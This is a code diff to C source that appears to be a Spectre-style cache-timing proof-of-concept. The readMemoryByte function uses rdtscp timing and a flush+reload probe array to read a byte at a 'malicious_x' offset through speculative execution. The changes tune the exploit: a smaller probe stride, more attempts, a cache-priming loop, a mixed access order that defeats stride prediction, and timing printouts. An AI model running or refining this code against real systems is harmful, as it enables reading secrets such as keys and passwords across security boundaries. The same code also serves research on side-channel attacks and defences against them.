@@ -8,7 +8,7 @@
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
 
-#define DIST 256
+#define DIST 128
 #define SET 256
 
 /********************************************************************
@@ -62,7 +62,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
   for (i = 0; i < SET; i++)
     results[i] = 0;
-  for (tries = 1; tries > 0; tries--) {
+  for (tries = 9; tries > 0; tries--) {
 
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < SET; i++)
@@ -71,10 +71,11 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	// prime data over cache
 	printf("priming...\n");
 	for( i=0;i<SET;i++) {
+      	mix_i = ((i * 167) + 13) & 255;
 		time1 = __rdtscp(&junk);
-		temp&= array2[i * DIST];
+		temp&= array2[mix_i * DIST];
 		time2 = __rdtscp(&junk) - time1;
-	  	printf("0x%02X's access time is %d\n",i,time2);
+	  	printf("%03d : 0x%02X's access time is %d\n",i,mix_i,time2);
 	}
 
 
@@ -98,14 +99,14 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	printf("probing...\n");
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
     for (i = 0; i < SET; i++) {
-      //mix_i = ((i * 167) + 13) & 255;
-      addr = & array2[i * DIST];
+      mix_i = ((i * 167) + 13) & 255;
+      addr = & array2[mix_i * DIST];
       time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-	  printf("0x%02X's access time is %d\n",i,time2);
-      if (time2 <= CACHE_HIT_THRESHOLD && i != array1[tries % array1_size])
-        results[i]++; /* cache hit - add +1 to score for this value */
+	  printf("%03d : 0x%02X's access time is %d\n",i,mix_i,time2);
+      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+        results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
     /* Locate highest & second-highest results results tallies in j/k */
